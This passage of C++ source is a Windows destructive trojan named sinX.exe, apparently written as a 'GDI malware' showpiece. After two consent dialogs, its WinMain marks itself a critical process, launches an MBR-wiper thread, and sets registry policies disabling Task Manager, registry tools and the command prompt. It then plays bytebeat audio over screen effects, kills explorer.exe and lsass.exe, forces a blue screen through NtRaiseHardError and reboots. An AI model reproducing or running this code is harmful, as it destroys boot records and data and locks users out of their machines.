		buffer[t] = static_cast<char>(t * (t ^ t + (t >> 15 & 1) * (t - 1280 ^ t) >> 7));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound6() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (15 * t >> 10) + t >> 6 ^ t >> 8);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound7() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(((t ^ 150) * log(t >> 3)) * tan(t >> 7));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
void reg_add( //credits to Mist0090 
	HKEY HKey,
	LPCWSTR Subkey,
	LPCWSTR ValueName,
	unsigned long Type,
	unsigned int Value
)
{
	HKEY hKey;
	DWORD dwDisposition;
	LONG result;


	result = RegCreateKeyExW(
		HKey, //HKEY
		Subkey,
		0,
		NULL,
		REG_OPTION_NON_VOLATILE,
		KEY_ALL_ACCESS,
		NULL,
		&hKey,
		&dwDisposition);

	result = RegSetValueExW(
		hKey,
		ValueName,
		0,
		Type,
		(const unsigned char*)&Value,
		(int)sizeof(Value)
	);

	RegCloseKey(hKey);
	return;
}
DWORD WINAPI dumb(LPVOID lpParam) {
	MessageBox(NULL, L"Are you really that stupid?", L"...", MB_ICONQUESTION | MB_YESNOCANCEL);
	return 0;
}
int CALLBACK WinMain(
	HINSTANCE hInstance, HINSTANCE hPrevInstance,
	LPSTR     lpCmdLine, int       nCmdShow
)
{
	if (MessageBoxW(NULL, L"WARNING!!!\nYou are now running a Trojan known as sinX.exe.\n\nIt can destroy your bootloader and programs if you proceed!\nThe creator Executioner isn't responsible for any damage.\n\nAre you sure you want to continue?", L"Numb colors.. rippled fingers and vision..", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
	{
		ExitProcess(0);
	}
	else
	{
		if (MessageBoxW(NULL, L"This is your final warning.\n\nPress Yes to continue.\nPress No to exit. If you proceed. There is no going back.\n\nChoose wisely. I am not responsible.", L"The whispers get louder and louder. on repeat.", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
		{
			ExitProcess(0);
		}
		else
		{
			ProcessIsCritical();
			CreateThread(0, 0, MBRWiper, 0, 0, 0);
			CreateThread(0, 0, notaskbar, 0, 0, 0);
			reg_add(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableTaskMgr", REG_DWORD, 1);
			reg_add(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableRegistryTools", REG_DWORD, 1);
			reg_add(HKEY_CURRENT_USER, L"SOFTWARE\\Policies\\Microsoft\\Windows\\System", L"DisableCMD", REG_DWORD, 2);
			CreateThread(0, 0, dumb, 0, 0, 0);
			Sleep(3000);
			CreateThread(0, 0, msg, 0, 0, 0);
			Sleep(2000);
			HANDLE thread1 = CreateThread(0, 0, bright, 0, 0, 0);
			HANDLE thread1dot1 = CreateThread(0, 0, wave, 0, 0, 0);
			HANDLE thread1dot2 = CreateThread(0, 0, inv, 0, 0, 0);
			HANDLE thread1dot3 = CreateThread(0, 0, textz, 0, 0, 0);
			sound1();
			Sleep(30000);
			TerminateThread(thread1, 0);
			CloseHandle(thread1);
			TerminateThread(thread1dot2, 0);
			CloseHandle(thread1dot2);
			TerminateThread(thread1dot3, 0);
			CloseHandle(thread1dot3);
			InvalidateRect(0, 0, 0);
			HANDLE thread2 = CreateThread(0, 0, shader1, 0, 0, 0);
			HANDLE thread2dot1 = CreateThread(0, 0, darken, 0, 0, 0);
			sound2();
			Sleep(30000);
			TerminateThread(thread2, 0);
			CloseHandle(thread2);
			TerminateThread(thread2dot1, 0);
			CloseHandle(thread2dot1);
			InvalidateRect(0, 0, 0);
			HANDLE thread3 = CreateThread(0, 0, shader2, 0, 0, 0);
			HANDLE thread3dot1 = CreateThread(0, 0, swirl, 0, 0, 0);
			sound3();
			Sleep(30000);
			TerminateThread(thread3, 0);
			CloseHandle(thread3);
			TerminateThread(thread3dot1, 0);
			CloseHandle(thread3dot1);
			InvalidateRect(0, 0, 0);
			HANDLE thread4 = CreateThread(0, 0, swirl2, 0, 0, 0);
			HANDLE thread4dot1 = CreateThread(0, 0, inv2, 0, 0, 0);
			sound4();
			Sleep(30000);
			TerminateThread(thread4, 0);
			CloseHandle(thread4);
			TerminateThread(thread4dot1, 0);
			CloseHandle(thread4dot1);
			InvalidateRect(0, 0, 0);
			HANDLE thread5 = CreateThread(0, 0, shader3, 0, 0, 0);
			HANDLE thread5dot1 = CreateThread(0, 0, ripple, 0, 0, 0);
			sound5();
			Sleep(30000);
			TerminateThread(thread5, 0);
			CloseHandle(thread5);
			TerminateThread(thread5dot1, 0);
			CloseHandle(thread5dot1);
			InvalidateRect(0, 0, 0);
			CreateThread(0, 0, texts, 0, 0, 0);
			HANDLE thread6 = CreateThread(0, 0, shader4, 0, 0, 0);
			HANDLE thread6dot1 = CreateThread(0, 0, WindowsCorruptionPayload, 0, 0, 0);
			sound6();
			Sleep(30000);
			TerminateThread(thread6, 0);
			CloseHandle(thread6);
			TerminateThread(thread6dot1, 0);
			CloseHandle(thread6dot1);
			InvalidateRect(0, 0, 0);
			ShellExecuteA(NULL, NULL, "shutdown", "/s", NULL, SW_SHOWDEFAULT);
			ShellExecuteA(NULL, NULL, "taskkill", "/f /im explorer.exe", NULL, SW_SHOWDEFAULT);
			ShellExecuteA(NULL, NULL, "taskkill", "/f /im lsass.exe", NULL, SW_SHOWDEFAULT);
			HANDLE thread7 = CreateThread(0, 0, whatthefuck, 0, 0, 0);
			HANDLE thread7dot1 = CreateThread(0, 0, shaderLAST, 0, 0, 0);
			sound7();
			Sleep(30000);
			TerminateThread(thread7, 0);
			CloseHandle(thread7);
			TerminateThread(thread7dot1, 0);
			CloseHandle(thread7dot1);
			InvalidateRect(0, 0, 0);
			BOOLEAN bl;
			DWORD response;
			NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll"), "NtRaiseHardError");
			RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
			RtlAdjustPrivilege(19, 1, 0, &bl);
			NtRaiseHardError(0xC0000001 + random() % 0x38e, 0, 0, 0, 6, &response);
			// If the computer is still running, do it the normal way
			HANDLE token;
			TOKEN_PRIVILEGES privileges;

			OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token);

			LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &privileges.Privileges[0].Luid);
			privileges.PrivilegeCount = 1;
			privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

			AdjustTokenPrivileges(token, FALSE, &privileges, 0, (PTOKEN_PRIVILEGES)NULL, 0);

			// The actual restart
			ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_HARDWARE | SHTDN_REASON_MINOR_DISK);
			return 0;
		}
	}
}